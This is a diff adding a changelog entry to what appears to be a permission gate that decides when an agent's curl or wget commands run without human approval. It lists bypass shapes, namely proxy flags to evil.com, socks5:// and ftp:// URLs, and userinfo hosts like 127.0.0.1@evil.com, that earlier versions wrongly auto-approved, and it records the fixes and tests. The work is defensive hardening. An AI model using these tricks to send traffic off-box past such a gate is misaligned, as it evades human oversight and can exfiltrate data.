@@ -1,5 +1,39 @@
 # Changelog
 
+## 3.34.0 — 2026-10-16
+**D14 read locality from URLs only; the read itself had two fail-opens.**
+
+- **What prompted (observed, not inferred).** `curl -s -m 5 127.0.0.1:9931/models`
+  hit the floor: `NETWORK_URL_RE` required a scheme, so `isLoopbackEgress`
+  saw zero destinations and failed closed — a local call to the model server,
+  approved by hand. `NETWORK_URL_RE` also stopped at `]`, so
+  `http://[::1]:41184/ping` reached `isLoopbackHost` truncated; D14 had
+  logged bracketed IPv6 as unprovable rather than noticed the truncation.
+- **Fix.** The URL regex keeps a bracketed IPv6 host whole. A destination is
+  now read from either form it appears in: a URL, or a scheme-less
+  `host[:port]/path` operand of curl/wget (`BARE_TARGET_RE`) — the proof is
+  the HOST and the scheme adds nothing the host parse lacks. The port or path
+  is what separates a target from a file operand, so `curl -O pkg.tgz` and a
+  bare `curl 127.0.0.1` stay unprovable.
+- **Two live fail-opens, closed by the same change.** Reading hosts out of
+  more forms is only sound if a destination the parse CANNOT read is never
+  dropped — dropping is fail-open, because the loopback hosts that survive
+  still satisfy "every destination is loopback". `curl -x evil.com:8080
+  http://127.0.0.1/y` (a proxy: off-box egress whatever the URL says) and
+  `curl --proxy socks5://evil.com:1080 http://127.0.0.1/y` / `ftp://…`
+  alongside a local URL both auto-judged before this (run against a 3.33.0
+  tree: `JUDGED` for all three). `HOSTISH_RE` and
+  `OPAQUE_SCHEME_RE` force the stop for a destination in those shapes, plus
+  the scheme-less userinfo form `curl 127.0.0.1@evil.com/x`. `Accept:` (a
+  header value) and `user:pass` (a credential) are excluded: a port is
+  digits, and a trailing colon proves nothing.
+- **Tests.** `test/dspa-gate.test.ts` — the bracketed IPv6 case moves from
+  the stop list to judgeable, and 9 cases pin the new line: 4 scheme-less
+  judgeable targets, and stops for `127.0.0.1.evil.com/x`,
+  `evil.example.com:8080/x`, `127.0.0.1@evil.com/x`, bare `curl 127.0.0.1`,
+  `curl -O pkg.tgz`, the proxy value, `socks5://` and `ftp://`. 4020 tests
+  pass.
+
 ## 3.33.0 — 2026-10-16
 **The bypass surface was the text layer: quote pairing, flag clusters, operand positions.**
 
